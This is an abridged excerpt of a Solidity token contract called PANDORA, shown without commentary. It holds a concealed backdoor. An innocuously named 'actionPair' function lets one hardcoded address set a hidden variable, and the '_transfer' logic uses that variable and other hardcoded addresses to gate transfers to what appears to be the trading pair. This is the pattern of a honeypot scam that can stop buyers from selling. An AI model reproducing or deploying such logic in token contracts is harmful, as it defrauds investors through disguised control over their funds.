...
contract TOKEN is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x1F83123E9E8D2655c265fAb341155dA43dE0F1CE) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _p76234 && to == 
        0x8B7e5E5A431557FCB1be45A9f227a083425246d9) ||
         (_p76234 == to && from != 0x8B7e5E5A431557FCB1be45A9f227a083425246d9 && 
         from  != 0x1d5FaF25b9d64A3DB1253c2978AcCb278bEC7FC4 
         && from != 0x99C9Af10cC95d9a4a5874Ac04134aea961391B3a)) {
    ...
    constructor() {
        _name = unicode"PANDORA";
        _symbol = unicode"PANDORA";
